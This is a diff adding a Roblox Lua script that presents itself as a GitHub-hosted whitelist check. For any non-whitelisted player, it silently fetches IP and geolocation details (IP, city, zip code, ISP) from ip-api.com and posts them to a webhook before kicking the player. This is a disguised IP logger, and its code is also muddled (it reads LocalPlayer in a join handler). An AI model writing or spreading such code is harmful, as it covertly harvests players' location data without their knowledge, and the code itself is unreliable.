@@ -1,0 +1,67 @@
+local HttpService = game:GetService("HttpService")
+
+local function isPlayerWhitelisted(playerName)
+    -- GitHub raw file URL (replace this with your actual URL)
+    local whitelistUrl = "https://raw.githubusercontent.com/YourGitHubUsername/YourRepo/main/whitelist.txt"
+    
+    -- Try to fetch the data from GitHub
+    local success, response = pcall(function()
+        return HttpService:GetAsync(whitelistUrl)
+    end)
+    
+    if success then
+        -- Split the response into a table of player names
+        local whitelist = {}
+        for line in string.gmatch(response, "[^\r\n]+") do
+            table.insert(whitelist, line)
+        end
+
+        -- Check if the player is in the whitelist
+        for _, whitelistedName in ipairs(whitelist) do
+            if playerName == whitelistedName then
+                return true
+            end
+        end
+    else
+        warn("Failed to fetch the whitelist from GitHub.")
+    end
+    
+    return false
+end
+
+game.Players.PlayerAdded:Connect(function(player)
+    local playerName = player.Name
+
+    -- Check if player is whitelisted
+    if isPlayerWhitelisted(playerName) then
+        print("Hello World, " .. playerName)
+    else
+        -- Send IP and location info if not whitelisted
+        local player_name = game:GetService("Players").LocalPlayer.Name
+        local webhook_url = "URL"  -- Replace with your actual webhook URL
+
+        -- Fetch IP information
+        local ip_info = HttpService:GetAsync("http://ip-api.com/json")
+        local ipinfo_table = HttpService:JSONDecode(ip_info)
+
+        -- Format the message
+        local dataMessage = string.format(
+            "```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```",
+            player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode,
+            ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip,
+            ipinfo_table.isp, ipinfo_table.org
+        )
+
+        -- Send data to the webhook
+        local success, err = pcall(function()
+            HttpService:PostAsync(webhook_url, HttpService:JSONEncode({["content"] = dataMessage}), Enum.HttpContentType.ApplicationJson)
+        end)
+
+        if not success then
+            warn("Failed to send data to webhook: " .. err)
+        end
+
+        -- Kick the player with a message
+        player:Kick("You Are Not Whitelisted")
+    end
+end)
